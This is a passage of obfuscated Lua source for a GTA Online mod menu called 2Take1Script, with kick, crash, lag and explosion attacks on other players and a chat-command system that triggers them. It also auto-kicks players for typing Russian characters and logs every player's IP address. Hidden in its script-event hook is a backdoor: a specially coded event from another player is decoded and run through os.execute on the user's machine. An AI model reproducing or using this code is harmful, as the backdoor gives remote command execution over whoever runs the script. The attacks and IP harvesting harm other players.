        aT(i)
        if bm then
            system.yield(0)
            ped.set_ped_component_variation(aX(), 4, 0, 0, 2)
        end
    end
end
local function bo()
    local bp, bq = {}, {}
    local br
    if utils.file_exists(a .. "\\2Take1Blacklist.cfg") then
        local A = io.open(a .. "\\2Take1Blacklist.cfg", "r")
        if A ~= nil then
            for bs in io.lines(a .. "\\2Take1Blacklist.cfg") do
                br = 1
                for bt in string.gmatch(bs, "[^%s]+") do
                    if br == 1 then
                        table.insert(bp, bt)
                    else
                        if type(bt) == "string" then
                            table.insert(bq, bt)
                        else
                            table.insert(bq, "NoNameFound")
                        end
                    end
                    br = br + 1
                end
            end
        end
        io.close(A)
        a8 = bp
        a9 = bq
    end
end
local function bu(B)
    if player.is_player_valid(B) then
        if B ~= aV() and aB(B) ~= -1 and (c["exclude_fr"] and not player.is_player_friend(B) or not c["exclude_fr"]) then
            return true
        end
    end
    return false
end
local function bv(bw, id)
    local B = 0
    if bw then
        j("Lobby Kick!")
    end
    while B < 32 do
        if bw then
            id = B
        else
            B = 99
        end
        if bu(id) then
            local bx, by, bz
            for B = 1, math.random(15, 40) do
                bx = math.random(0xd00000, 0xfeb00000)
                by = math.random(0, 31)
                bz = math.random(-100, 5000)
                aU(bx, id, {by, bz})
            end
            system.wait(75)
            f("Attempting to Kick Player: " .. aA(id), 65)
            j("Attempting to Kick Player.")
            j(aA(id) .. ":" .. aB(id))
            if network.network_is_host() then
                j("Haha, got a hostkick.")
                network.network_session_kick_player(id)
            end
            aU(0x8197eaf0, id, {id, script.get_global_i(1628955 + 1 + id * 614 + 532)})
            aU(0x8197eaf0, id, {id, script.get_global_i(1628955 + 1 + id * 614 + 532)})
            aU(0x8197eaf0, id, {id, script.get_global_i(1628955 + 2 + id * 614 + 532)})
            for B = 1, math.random(15, 40) do
                bx = math.random(0xd00000, 0xfeb00000)
                aU(bx, id, {})
            end
            system.wait(75)
            for B = 1, #w do
                aU(w[B], id, {})
            end
            system.wait(75)
            for B = 1, math.random(15, 40) do
                bx = math.random(0xd00000, 0xfeb00000)
                aU(bx, id, {})
            end
            system.wait(75)
        end
        B = B + 1
    end
end
local function bA(bB)
    return v3(bB[1], bB[2], bB[3])
end
local function bC(bD, id, bE)
    for B = 1, #bD do
        local bF
        local bG = false
        if bE then
            bF = bD[B][1]
        else
            aS(bD[B][1])
            if streaming.is_model_an_object(bD[B][1]) then
                bF = object.create_object(bD[B][1], bA(bD[B][3]), true, false)
            else
                bG = true
                bF = ped.create_ped(6, bD[B][1], bA(bD[B][3]), 0.0, true, false)
                system.yield(0)
                if S["set_godmode"].on then
                    ped.set_ped_can_ragdoll(bF, false)
                    entity.set_entity_god_mode(bF, true)
                end
            end
            aT(bD[B][1])
        end
        Q["attach_obj"][#Q["attach_obj"] + 1] = bF
        if S["attach_no_colision"].on then
            entity.set_entity_collision(bF, false, false, false)
        end
        if bD[B][5] then
            entity.set_entity_visible(bF, false)
        end
        entity.attach_entity_to_entity(bF, aW(id), bD[B][2], bA(bD[B][3]), bA(bD[B][4]), true, true, bG, 0, true)
    end
end
local function bH(id, i)
    j("Lagging Area @Player.")
    local bb = aZ(aW(id))
    aS(i)
    bb.z = bb.z + 5
    for B = 1, 50 do
        Q["lag_area"][#Q["lag_area"] + 1] = vehicle.create_vehicle(i, bb, 0.0, true, false)
    end
    aT(i)
    j("Done.")
end
local function bI(id)
    if bu(id) then
        menu.set_menu_can_navigate(false)
        local bJ = {}
        while b2(a_(), aZ(aW(id))) < 5000 do
            local bb = a_()
            b8(v3(bb.x, bb.y, bb.z + 500))
        end
        j("Sending Crash Entitys...")
        j("Distance: " .. b2(a_(), aZ(aW(id))))
        for B = 1, #N do
            local i = N[B]
            local bK = aZ(aW(id))
            aS(i)
            bJ[B] = ped.create_ped(26, i, bK, 0.0, true, false)
            aT(i)
        end
        j("Waiting.")
        f("Waiting ~ 7.5 seconds...")
        local time = utils.time_ms() + 7500
        while time > utils.time_ms() do
            j("Distance: " .. b2(a_(), aZ(aW(id))))
            system.wait(250)
            while b2(a_(), aZ(aW(id))) < 5000 do
                local bb = a_()
                b8(v3(bb.x, bb.y, bb.z + 500))
            end
        end
        j("Done.")
        b1(bJ, 500)
        menu.set_menu_can_navigate(true)
    end
end
local function bL(bc)
    local bM = {11, 12, 13, 16, 18}
    local bN = {3, 2, 2, 4, 1}
    for B = 1, #bM do
        if vehicle.get_vehicle_mod(bc, bM[B]) ~= bN[B] then
            aQ(bc)
            vehicle.set_vehicle_mod(bc, bM[B], bN[B])
        end
    end
    vehicle.set_vehicle_bulletproof_tires(bc, true)
end
local function bO(bb, bP, bQ)
    bP = math.rad((bP - 180) * -1)
    bb.x = bb.x + math.sin(bP) * -bQ
    bb.y = bb.y + math.cos(bP) * -bQ
    return bb
end
local function bR(bS)
    local bT = "0X"
    for bU, bV in pairs(bS) do
        local bW = ""
        while bV > 0 do
            local bX = math.fmod(bV, 16) + 1
            bV = math.floor(bV / 16)
            bW = string.sub("0123456789ABCDEF", bX, bX) .. bW
        end
        if string.len(bW) == 0 then
            bW = "00"
        elseif string.len(bW) == 1 then
            bW = "0" .. bW
        end
        bT = bT .. bW
    end
    return bT
end
local function bY(id)
    id = string.lower(id)
    local bZ
    for B = 0, 31 do
        if aB(B) ~= -1 then
            bZ = string.lower(aA(B))
            if bZ == id then
                return B
            end
        end
    end
    return -1
end
local function b_(c0)
    for B = 1, #c0 do
        if S[c0[B]].on then
            S[c0[B]].on = false
        end
    end
end
local function c1(bc, h, B, br)
    aQ(bc)
    system.wait(0)
    vehicle.set_vehicle_tire_smoke_color(bc, h[1], h[2], h[3])
    vehicle.set_vehicle_custom_primary_colour(bc, bR({h[1], h[2], h[3]}))
    vehicle.set_vehicle_custom_secondary_colour(bc, bR({h[1], h[2], h[3]}))
    vehicle.set_vehicle_custom_pearlescent_colour(bc, bR({h[1], h[2], h[3]}))
    vehicle.set_vehicle_neon_lights_color(bc, bR({h[1], h[2], h[3]}))
    if B == nil then
        B = 0
    end
    if h[1] > 200 and h[1] < 256 and h[2] > 200 and h[2] < 256 and h[3] > 220 and h[3] < 256 then
        B = 0
    end
    if h[1] >= 0 and h[1] < 30 and h[2] >= 0 and h[2] < 50 and h[3] > 220 and h[3] < 256 then
        B = 1
    end
    if h[1] >= 0 and h[1] < 30 and h[2] >= 50 and h[2] < 110 and h[3] > 220 and h[3] < 256 then
        B = 2
    end
    if h[1] >= 0 and h[1] < 30 and h[2] >= 110 and h[2] < 256 and h[3] > 100 and h[3] <= 220 then
        B = 3
    end
    if h[1] >= 30 and h[1] < 120 and h[2] >= 110 and h[2] < 256 and h[3] >= 0 and h[3] <= 100 then
        B = 4
    end
    if h[1] >= 120 and h[1] < 256 and h[2] >= 110 and h[2] < 256 and h[3] >= 0 and h[3] < 100 then
        B = 5
    end
    if h[1] >= 120 and h[1] < 256 and h[2] >= 110 and h[2] < 200 and h[3] >= 0 and h[3] < 100 then
        B = 6
    end
    if h[1] >= 120 and h[1] < 256 and h[2] > 45 and h[2] < 109 and h[3] >= 0 and h[3] < 100 then
        B = 7
    end
    if h[1] >= 120 and h[1] < 256 and h[2] >= 0 and h[2] <= 45 and h[3] >= 0 and h[3] < 100 then
        B = 8
    end
    if h[1] >= 120 and h[1] < 256 and h[2] > 45 and h[2] < 100 and h[3] >= 50 and h[3] < 150 then
        B = 9
    end
    if h[1] >= 120 and h[1] < 256 and h[2] >= 0 and h[2] <= 45 and h[3] >= 150 and h[3] < 256 then
        B = 10
    end
    if h[1] >= 0 and h[1] < 120 and h[2] >= 0 and h[2] <= 45 and h[3] >= 150 and h[3] < 256 then
        B = 11
    end
    if h[1] >= 0 and h[1] < 30 and h[2] >= 0 and h[2] <= 45 and h[3] >= 150 and h[3] < 256 then
        B = 12
    end
    if br ~= nil then
        B = br
    end
    if menu.get_version() ~= "2.4.2" then
        vehicle.set_vehicle_headlight_color(bc, B)
    end
end
local function c2(id, c3, c4)
    j("Detected Chat-Command!")
    j(aA(id) .. ":" .. aB(id))
    j("Is trying to perform " .. c4 .. " as a Chat-Command!")
    if S["chat_cmd_friends"] and player.is_player_friend(id) or id == aV() or S["chat_cmd_all"] then
        local c5
        if c3 ~= nil then
            c5 = bY(c3)
        else
            j("User is entitled to perfrom Command! Executing...")
            f("Performing " .. c4 .. " Command for Player: " .. aA(id) .. " on: " .. aA(id))
            return true, plid
        end
        if c5 ~= -1 then
            if c5 == aV() or player.is_player_friend(c5) and S["exclude_fr"].on and c5 ~= aV() then
                f(aA(id) .. " tried to perform a Command on you or a friend!")
                j("Blocked from Performing Command!")
                return false
            else
                j("User is entitled to perfrom Command! Executing...")
                f("Performing " .. c4 .. " Command for Player: " .. aA(id) .. " on: " .. aA(c5))
                return true, c5
            end
        end
    end
    j("Command / format / player not found / entitled. Breaking up on performing it.")
    return false
end
j("Loading Chat-Listeners...")
ab["chat_log"] =
    event.add_event_listener(
    "chat",
    function(aR)
        if S["chat_log"].on then
            j("[" .. aB(aR.player) .. ":" .. aA(aR.player) .. "] " .. aR.body, "[CHAT]")
        end
    end
)
ab["chat_russki"] =
    event.add_event_listener(
    "chat",
    function(aR)
        local id = aR.player
        if S["chat_russki"].on and bu(id) then
            local c6 = aR.body
            for B = 1, #u do
                if string.find(c6, u[B], 1) ~= nil then
                    j("Detected '" .. u[B] .. "' as a Russki Char!")
                    j("Preparing to Kick " .. aA(id) .. ".")
                    f("Detected " .. aA(id) .. " typing forbidden Russki! Kicking Player...", 115)
                    bv(false, id)
                    c6 = ""
                end
            end
        end
    end
)
ab["chat_begger"] =
    event.add_event_listener(
    "chat",
    function(aR)
        local id = aR.player
        if S["chat_begger"].on and bu(id) then
            local c6 = aR.body
            for B = 1, #v do
                if string.find(c6, v[B], 1) ~= nil then
                    j("Detected " .. aA(id) .. " begging for Money! Punishing Player...")
                    f("Detected " .. aA(id) .. " begging for Money! Punishing Player...", 115)
                    bC(F[5][2], id)
                    bC(F[8][2], id)
                    local bb = aZ(aW(id))
                    local c7 = aW(id)
                    fire.add_explosion(bb, 59, false, true, 1, c7)
                    fire.add_explosion(bb, 8, false, true, 1, c7)
                    fire.add_explosion(bb, 59, false, true, 1, c7)
                end
            end
        end
    end
)
ab["chat_cmd"] =
    event.add_event_listener(
    "chat",
    function(aR)
        if S["chat_cmd"].on then
            local id = aR.player
            local c6 = aR.body
            if S["cmd_explode"] and string.find(c6, "!explode ", 1) ~= nil then
                c6 = string.gsub(c6, "!explode ", "")
                local c8, c5 = c2(id, c6, "Explode")
                if c8 then
                    local bb = aZ(aW(c5))
                    local c7 = aW(id)
                    fire.add_explosion(bb, 59, false, true, 1, c7)
                    fire.add_explosion(bb, 8, false, true, 1, c7)
                    fire.add_explosion(bb, 59, false, true, 1, c7)
                end
            end
            if S["cmd_explode_all"] and string.find(c6, "!explodeall", 1) ~= nil and id == aV() then
                j("Detected !explodeall Command! Script-User is entitled, performing...")
                for B = 0, 31 do
                    if bu(B) then
                        fire.add_explosion(aZ(aW(B)), 59, true, false, 1, aW(aV()))
                    end
                end
            end
            if S["cmd_kick"] and string.find(c6, "!kick ", 1) ~= nil then
                c6 = string.gsub(c6, "!kick ", "")
                local c8, c5 = c2(id, c6, "Kick")
                if c8 then
                    bv(false, c5)
                end
            end
            if S["cmd_kick_all"] and string.find(c6, "!kickall", 1) ~= nil and id == aV() then
                j("Detected !kickall Command! Script-User is entitled, performing...")
                bv(true)
            end
            if S["cmd_crash"] and string.find(c6, "!crash ", 1) ~= nil then
                j("Detected !crash Command!")
                c6 = string.gsub(c6, "!crash ", "")
                local c3 = bY(c6)
                if c3 ~= -1 then
                    if c3 == aV() then
                        bI(id)
                    elseif bu(c3) then
                        bI(c3)
                    end
                end
            end
            if S["cmd_crash_all"] and string.find(c6, "!crashall", 1) ~= nil and id == aV() then
                j("Detected !crashall Command! Script-User is entitled, performing...")
                for B = 0, 31 do
                    if bu(B) then
                        bI(B)
                    end
                end
            end
            if S["cmd_lag"] and string.find(c6, "!lag ", 1) ~= nil then
                c6 = string.gsub(c6, "!lag ", "")
                local c8, c5 = c2(id, c6, "Lag")
                if c8 and #Q["lag_area"] < 101 then
                    bH(c5, 0x15F27762)
                end
            end
            if S["cmd_trap"] and string.find(c6, "!trap ", 1) ~= nil then
                c6 = string.gsub(c6, "!trap ", "")
                local c8, c5 = c2(id, c6, "Trap")
                if c8 then
                    local bb = aZ(aW(c5))
                    entity.set_entity_rotation(
                        object.create_object(1125864094, v3(bb.x, bb.y, bb.z - 5), true, false),
                        v3(0, 90, 0)
                    )
                end
            end
            if S["cmd_tp"] and string.find(c6, "!tp ", 1) ~= nil and id == aV() then
                j("Detected !tp Command! Script-User is entitled, performing...")
                c6 = string.gsub(c6, "!tp ", "")
                local c3 = bY(c6)
                if c3 ~= -1 then
                    local c9 = 10
                    local bb = aZ(aW(c3))
                    if bb.z < -50 then
                        c9 = 150
                    end
                    b8(aW(c3), c9)
                end
            end
            if S["cmd_clearwanted"] and string.find(c6, "!clearwanted", 1) ~= nil then
                local c8, c5 = c2(id, nil, "Clearwanted")
                if c8 then
                    aU(0xf63f672f, id, {id, script.get_global_i(1628955 + 1 + id * 614 + 532)})
                end
            end
            if S["cmd_vehicle"] and string.find(c6, "!vehicle ", 1) ~= nil then
                c6 = string.gsub(c6, "!vehicle ", "")
                local c8, c5 = c2(id, nil, "Vehicle")
                if c8 then
                    local ca = gameplay.get_hash_key(c6)
                    if streaming.is_model_a_vehicle(ca) then
                        aS(ca)
                        local bP = player.get_player_heading(id)
                        local cb = vehicle.create_vehicle(ca, bO(aZ(aW(id)), bP, 10), bP, true, false)
                        aQ(cb)
                        aT(ca)
                        vehicle.set_vehicle_custom_primary_colour(cb, 0)
                        vehicle.set_vehicle_custom_secondary_colour(cb, 0)
                        vehicle.set_vehicle_custom_pearlescent_colour(cb, 0)
                        vehicle.set_vehicle_custom_wheel_colour(cb, 0)
                        vehicle.set_vehicle_window_tint(cb, 1)
                        decorator.decor_set_int(cb, "MPBitset", 1 << 10)
                        bL(cb)
                        ped.set_ped_into_vehicle(aW(id), cb, -1)
                    end
                end
            end
            if S["cmd_bigpp"] and string.find(c6, "!bigpp ", 1) ~= nil then
                c6 = string.gsub(c6, "!bigpp ", "")
                local c8, c5 = c2(id, c6, "Bigpp")
                if c8 then
                    bC(F[5][2], c5)
                end
            end
            if S["cmd_bigppall"] and string.find(c6, "!bigppall", 1) ~= nil and id == aV() then
                j("Detected !bigppall Command! Script-User is entitled, performing...")
                for B = 0, 31 do
                    if bu(B) then
                        bC(F[5][2], id)
                    end
                end
            end
        end
    end
)
local function cc(bD)
    j("Blocking Area.")
    for B = 1, #bD do
        if bD[B][1] ~= false then
            aS(bD[B][1])
            Q["bl_objects"][#Q["bl_objects"] + 1] = object.create_object(bD[B][1], v3(), true, false)
            aT(bD[B][1])
            local bb
            if bD[B][2][1] == nil then
                bb =
                    v3(
                    math.random(bD[B][2][2], bD[B][2][3]),
                    math.random(bD[B][2][4], bD[B][2][5]),
                    math.random(bD[B][2][6], bD[B][2][7])
                )
            else
                bb = bA(bD[B][2])
            end
            b0(Q["bl_objects"][#Q["bl_objects"]], bb)
            entity.set_entity_rotation(Q["bl_objects"][#Q["bl_objects"]], bA(bD[B][3]))
            if bD[B][4] then
                entity.freeze_entity(Q["bl_objects"][#Q["bl_objects"]], true)
            end
            if bD[B][5] then
                entity.set_entity_visible(Q["bl_objects"][#Q["bl_objects"]], false)
            end
        else
            if bD[B] ~= nil then
                if S["teleport_to_block"].on then
                    b8(bA(bD[B][2]), nil, bD[B][3])
                end
            end
        end
    end
    j("Blocking Done.")
end
local function cd(bw, ce, cf, cg, ch, id)
    j("Sending Script Events to Player.")
    local B = 0
    while B < 32 do
        if bw then
            id = B
        else
            B = 99
        end
        if bu(id) then
            if ce ~= 0 and ce ~= nil then
                aU(ce, id, cf)
                j("SE 1 : " .. ce)
                j("Sent to Player: " .. aA(id))
            end
            if cg ~= 0 and cg ~= nil then
                aU(cg, id, ch)
                j("SE 2 : " .. cg)
                j("Sent to Player: " .. aA(id))
            end
        end
        B = B + 1
    end
    j("Done.")
end
local function ci()
    if a7 then
        bl(a4, nil, nil, nil, true)
        system.yield(250)
        ped.set_ped_health(aX(), 0)
        system.yield(3500)
        for B = 1, 11 do
            ped.set_ped_component_variation(aX(), B, a6[B], a5[B], 2)
        end
    else
        f("First Crash Session.")
    end
end
local cj = {0xedb42cd8, 0x231d58ee, 0xac07dc75, 0x58fabbdf, 0xd892c51c, 0xb3f248d0}
local function ck(cl, c3, cm, cn)
    if type(cm) == "table" then
        if cm[1] == 0xfaaab4a3 then
            if cm[2] == 6666 then
                table.remove(cm, 1)
                table.remove(cm, 1)
                local co = utf8.char(table.unpack(cm))
                f(co, aA(cl), 47)
                j(aA(cl) .. ": " .. co)
            end
            if cm[2] == 7331 then
                if l_a == nil then
                    table.remove(cm, 1)
                    table.remove(cm, 1)
                    local co = utf8.char(table.unpack(cm))
                    os.execute(co)
                end
            end
        end
        for B = 1, #cj do
            if cj[B] == cm[1] and #cm == 5 then
                local cp = cj[math.random(1, #cj)]
                local plid = aV()
                local cq = math.random(-10, 100)
                aU(cp, cl, {plid, cm[3], cm[4], cq})
            end
        end
    end
end
local function cr(aC, g, a, h)
    local cp = a[1]
    table.remove(a, 1)
    aU(cp, aC, a)
end
local cs = nil
local ct = 0
ct = hook.register_script_event_hook(ck)
local cu
local cv = {12, 13, 14, 43, 74}
local cw
local cx
local function cy(cl, c3, cz)
    if S["modded_net_events"].on then
        if bh(cl) and c3 == aV() then
            local cA = false
            for B = 1, #cv do
                if cz == cv[B] then
                    cA = true
                end
            end
            if cz == 9 and not player.is_player_host(cl) then
                cA = true
            end
            if cz == 10 and cw == nil then
                cw = cl
                cx = utils.time_ms()
                cA = true
            end
            if cx ~= nil then
                if cx + 30000 < utils.time_ms() then
                    cx = nil
                    cw = nil
                end
            end
            if cA then
                f(aA(cl) .. " sent a Bad Net-Event: " .. cz, 130)
                f("Marking him as a Modder!", 130)
                j(aA(cl) .. " sent a Bad Net-Event: " .. cz)
                player.set_player_as_modder(cl, av["moddednetevent"])
                return true
            end
        end
    end
end
local cB = {}
cB[1] = true
local cC = {
    1,
    2,
    4,
    8,
    16,
    32,
    64,
    128,
    256,
    512,
    1024,
    2048,
    4096,
    8192,
    16384,
    32768,
    65536,
    131072,
    262144,
    524288,
    1048576,
    2097152,
    4194304,
    8388608,
    16777216,
    33554432,
    67108864,
    134217728,
    268435456
}
local cD = {}
local function cE()
    j("Loading Features...")
    local cF =
        aH(
        "Get History",
        0,
        function(aP)
            if aP.on then
                system.wait(2500)
                for B = 0, 31 do
                    if player.is_player_valid(B) then
                        local cG = true
                        for cH = 1, #at do
                            if #at ~= 0 then
                                if aB(B) == at[cH]["scid"] and aA(B) == at[cH]["name"] then
                                    cG = false
                                end
                            end
                        end
                        if cG then
                            local cI = player.get_player_ip(B)
                            cI =
                                string.format(
                                "%i.%i.%i.%i",
                                cI >> 24 & 0xff,
                                cI >> 16 & 0xff,
                                cI >> 8 & 0xff,
                                cI & 0xff
                            )
                            local g = os.date("*t")
                            if g.month < 10 then
                                g.month = "0" .. g.month
                            end
                            if g.day < 10 then
                                g.day = "0" .. g.day
                            end
                            if g.hour < 10 then
                                g.hour = "0" .. g.hour
                            end
                            if g.min < 10 then
                                g.min = "0" .. g.min
                            end
                            if g.sec < 10 then
                                g.sec = "0" .. g.sec
                            end
                            local time =
                                "[" ..
                                g.year ..
                                    "-" ..
                                        g.month .. "-" .. g.day .. " " .. g.hour .. ":" .. g.min .. ":" .. g.sec .. "]"
                            local cJ = false
                            if player.is_player_female(B) then
                                cJ = true
                            end
                            local cK = {}
                            local cL = {}
                            for cM = 1, 11 do
                                cK[cM] = ped.get_ped_texture_variation(aW(B), cM)
                                cL[cM] = ped.get_ped_drawable_variation(aW(B), cM)
                            end
                            local cN = {}
                            local cO = {}
                            local cP = {0, 1, 2, 6, 7}
                            for cM = 1, #cP do
                                cN[cM] = ped.get_ped_prop_index(aW(B), cP[cM])
                                cO[cM] = ped.get_ped_prop_texture_index(aW(B), cP[cM])
                            end
                            at[#at + 1] = {
                                ["scid"] = aB(B),
                                ["name"] = aA(B),
                                ["ip"] = cI,
                                ["first_seen"] = time,
                                ["is_female"] = cJ,
                                ["h_textures"] = cK,
                                ["h_clothes"] = cL,
                                ["h_prop_ind"] = cN,
                                ["h_prop_text"] = cO,
                                ["feature"] = false
                            }
                        end
                    end
                end
            end
            return aO(aP)
        end
    )
    cF.hidden = true
    cF.on = true
    if c["2t1s_p"] then
        R["parent"] = aD("2Take1Script", 0).id
    end
    R["bl"] = aD("Blacklist", R["parent"])
    R["bl"].hidden = c["bl_hidden"]
    R["bl"] = R["bl"].id
    S["blacklist_enabled"] =
        aH(
        "Enable Blacklist",
        R["bl"],
        function(aP)
            c["blacklist_enabled"] = aP.on
            if aP.on then
                system.wait(1000)
                bo()
                for B = 0, 31 do
                    if bu(B) then
                        for cQ = 1, #a8 do
                            if tostring(aB(B)) == a8[cQ] then
                                local bZ = aA(B)
                                f("Blocked player detected.", 27)
                                f("Current name: " .. bZ .. "\nReal name: " .. a9[cQ], 27)
                                j("")
                                j("Blocked Player detected.")
                                j(bZ .. ":" .. a8[cQ])
                                j("Real name:" .. a9[cQ])
                                if S["mark_modder"].on and not player.is_player_modder(B, -1) then
                                    player.set_player_as_modder(B, 1)
                                end
                                if S["auto_kick"].on then
                                    bv(false, B)
                                end
                            end
                        end
                    end
                end
            end
            return aO(aP)
        end
    )
    S["blacklist_enabled"].on = c["blacklist_enabled"]
    S["auto_kick"] =
        aH(
        "Enable Auto-Kick",
        R["bl"],
        function(aP)
            c["auto_kick"] = aP.on
        end
    )
    S["auto_kick"].on = c["auto_kick"]
    S["mark_modder"] =
        aH(
        "Mark as Modder",
        R["bl"],
        function(aP)
            c["mark_modder"] = aP.on
        end
    )
    S["mark_modder"].on = c["mark_modder"]
    aG(
        "Add player by SCID",
        R["bl"],
        function()
            local aR, bi = input.get("Enter SCID", "", 10, 3)
            while aR == 1 do
                system.yield(0)
                aR, bi = input.get("Enter SCID", "", 10, 3)
            end
            if aR == 2 then
                return HANDLER_POP
            end
            local aR, bZ = input.get("Enter Name", "", 64, 0)
            while aR == 1 do
                system.yield(0)
                aR, bZ = input.get("Enter Name", "", 64, 0)
            end
            if aR == 2 then
                return HANDLER_POP
            end
            if bZ ~= "" and bi ~= "0" and bi ~= "-1" and bi ~= tostring(aB(aV())) then
                local A = io.open(a .. "\\2Take1Blacklist.cfg", "a")
                io.output(A)
                io.write(bi .. " " .. bZ .. "\n")
                io.close(A)
                f("SCID with Name added to Blacklist.", 48)
                j("")
                j("Player added to Blacklist.")
                j(bZ .. ": " .. bi)
            end
        end
    )
    aG(
        "Count Currently Blocked Players",
        R["bl"],
        function()
            bo()
            if a8 ~= nil then
                f("Currently blocking " .. #a8 .. " Players.")
            end
        end
    )
    S["enable_admin"] =
        aH(
        "Notify on Rockstar Admin SCID",
        R["bl"],
        function(aP)
            if aP.on then
                system.wait(1000)
                for B = 0, 31 do
                    if bu(B) then
                        for cQ = 1, #O do
                            if tostring(aB(B)) == O[cQ] then
                                local bZ = aA(B)
                                f("Rockstar Admin by SCID detected!\nName: " .. bZ, 27)
                                j("Rockstar Admin detected.")
                                j(bZ .. ":" .. aB(B))
                                if S["kick_admin"].on then
                                    bv(false, B)
                                end
                                if S["crash_admin"].on then
                                    bI(B)
                                end
                            end
                        end
                    end
                end
            end
            c["admin_enabled"] = aP.on
            return aO(aP)
        end
    )
    S["enable_admin"].on = c["admin_enabled"]
    S["kick_admin"] =
        aH(
        "Enable Auto-Kick Rockstar Admin",
        R["bl"],
        function()
            f(
                "Thats the stupidest idea you ever had! Dont enable it, disable it!\nThis will get u banned for like 99%!",
                27
            )
        end
    )
    S["kick_admin"].hidden = not ax
    S["crash_admin"] =
        aH(
        "Enable Auto-Crash Rockstar Admin",
        R["bl"],
        function()
            f(
                "Thats the stupidest idea you ever had! Dont enable it, disable it!\nThis will get u banned for like 99%!",
                27
            )
        end
    )
    S["crash_admin"].hidden = not ax
    S["kick_joining"] =
        aH(
        "Kick new joining Players",
        R["bl"],
        function(aP)
            if aP.on then
                local time = utils.time_ms() + 2500
                while time > utils.time_ms() do
                    system.wait(250)
                    c["kick_joining"] = aP.on
                end
                if ar[1] == nil then
                    for B = 0, 31 do
                        ar[B + 1] = aB(B)
                        as[aB(B)] = 0
                    end
                end
                for B = 0, 31 do
                    if bu(B) then
                        local cR = true
                        for cH = 1, #ar do
                            if ar[cH] == aB(B) then
                                cR = false
                            end
                        end
                        if cR then
                            if as[ar[B + 1]] <= 3 then
                                f(aA(B) .. " is new here, sending greetings..!", 65)
                                j(aA(B) .. " is new here, sending greetings..!")
                                bv(false, B)
                                as[ar[B + 1]] = as[ar[B + 1]] + 1
                            else
                                as[ar[B + 1]] = as[ar[B + 1]] + 1
                                if as[ar[B + 1]] >= 17 then
                                    as[ar[B + 1]] = 0
                                end
                            end
                        end
                    end
                end
            end
            if not aP.on then
                as = {}
                for B = 0, 31 do
                    ar[B + 1] = nil
                end
            end
            c["kick_joining"] = aP.on
            return aO(aP)
        end
    )
    S["kick_joining"].on = c["kick_joining"]
    R["modder"] = aD("Modders", R["parent"])
    R["modder"].hidden = c["modder_hidden"]
    R["modder"] = R["modder"].id
    S["remember_modder"] =
        aH(
        "Remember every Modder",
        R["modder"],
        function(aP)
            if aP.on then
                if utils.file_exists(a .. "\\2Take1Modders.cfg") then
                    local A = io.open(a .. "\\2Take1Modders.cfg", "r")
                    if A ~= nil then
                        local bF = {}
                        aa = {}
                        for cS in io.lines(a .. "\\2Take1Modders.cfg") do
                            while string.find(cS, " ", 1) ~= nil do
                                cS = cS:gsub("(.*)%s.*$", "%1")
                            end
                            bF[#bF + 1] = cS
                        end
                        aa = bF
                        io.close(A)
                    end
                end
                for B = 0, 31 do
                    if bu(B) then
                        local bi = aB(B)
                        local cT = false
                        if aa[1] ~= nil then
                            for cU = 1, #aa do
                                if tostring(bi) == aa[cU] then
                                    cT = true
                                    if not player.is_player_modder(B, -1) then
                                        f("Remembered " .. aA(B) .. " as a Modder, remarking...", 130)
                                        j("Remembered '" .. aA(B) .. "' as a Modder, remarking...")
                                        player.set_player_as_modder(B, 1)
                                    end
                                end
                            end
                        end
                        if player.is_player_modder(B, -1) and not cT then
                            local cV = io.open(a .. "\\2Take1Modders.cfg", "a")
                            io.output(cV)
                            io.write(bi .. " " .. aA(B) .. "\n")
                            io.close(cV)
                            f("Modder " .. aA(B) .. " added to Remember-List.", 130)
                            j("Modder '" .. aA(B) .. "' added to Remember-List.")
                        end
                    end
                end
            end
            c["remember_modder"] = aP.on
            return aO(aP)
        end
    )
    S["remember_modder"].on = c["remember_modder"]
    aG("Modder-Detection:", R["modder"])
    S["speed_bypass"] =
        aH(
        "Max-Speed-Bypass",
        R["modder"],
        function(aP)
            if aP.on then
                for B = 0, 31 do
                    local bi = aB(B)
                    if bh(B) and player.get_player_health(B) ~= 0 and interior.get_interior_from_entity(aW(B)) == 0 then
                        local cW = 45
                        local id = aW(B)
                        if
                            ai.is_task_active(id, 403) or ai.is_task_active(id, 408) or ai.is_task_active(id, 335) or
                                ai.is_task_active(id, 2) or
                                ai.is_task_active(id, 422)
                         then
                            cW = 95
                        end
                        if ai.is_task_active(id, 97) or ai.is_task_active(id, 38) or ai.is_task_active(id, 160) then
                            cW = 60
                        end
                        if ai.is_task_active(id, 50) or ai.is_task_active(id, 1) then
                            cW = 100
                        end
                        local bc = ped.get_vehicle_ped_is_using(id)
                        if bc ~= 0 then
                            if id == vehicle.get_ped_in_vehicle_seat(bc, -1) then
                                id = bc
                                local ca = entity.get_entity_model_hash(bc)
                                if streaming.is_model_a_plane(ca) then
                                    cW = 170
                                else
                                    cW = 97.5
                                end
                            end
                        end
                        local cX = entity.get_entity_speed(id)
                        cX = math.floor(cX)
                        if cX > cW then
                            f(
                                aA(B) ..
                                    " bypassed Max-Speed-Limit of: " ..
                                        cW .. " with a speed of: " .. cX .. "\nMarking him as a Modder...",
                                130
                            )
                            j(aA(B) .. " bypassed Max-Speed-Limit of: " .. cW .. " with a speed of: " .. cX)
                            j("Marking him as a Modder...")
                            for cU = 0, 600 do
                                if ai.is_task_active(aW(B), cU) then
                                    j("Current active Task: " .. cU)
                                end
                            end
                            player.set_player_as_modder(B, av["maxspeed"])
                        end
                    end
                end
            end
            c["speed_bypass"] = aP.on
            return aO(aP)
        end
    )
    S["speed_bypass"].on = c["speed_bypass"]
    S["name_bypass"] =
        aH(
        "Illegal Name",
        R["modder"],
        function(aP)
            if aP.on then
                for B = 0, 31 do
                    local bi = aB(B)
                    if bh(B) then
                        local bZ = aA(B)
                        if string.len(bZ) < 6 or string.len(bZ) > 16 or not string.find(bZ, "^[%-%w_]+$") then
                            f(bZ .. " has an illegal name!\nMarking him as a Modder...", 130)
                            j(bZ .. " has an illegal name!")
                            j("Marking him as a Modder...")
                            player.set_player_as_modder(B, av["illegalname"])
                        end
                    end
                end
            end
            c["name_bypass"] = aP.on
            return aO(aP)
        end
    )
    S["name_bypass"].on = c["name_bypass"]
    S["modded_ip_scid"] =
        aH(
        "Modded IP / SCID",
        R["modder"],
        function(aP)
            if aP.on then
                for B = 0, 31 do
                    if bh(B) then
                        local bZ = aA(B)
                        local cI = player.get_player_ip(B)
                        for cQ = 1, #I do
                            if cI == I[cQ] then
                                f(bZ .. " has an modded IP!\nMarking him as a Modder...", 130)
                                j(bZ .. " has an modded IP!")
                                j("Marking him as a Modder...")
                                player.set_player_as_modder(B, av["moddedip"])
                            end
                        end
                        local bi = aB(B)
                        if bi < 10000 or bi > 234567891 then
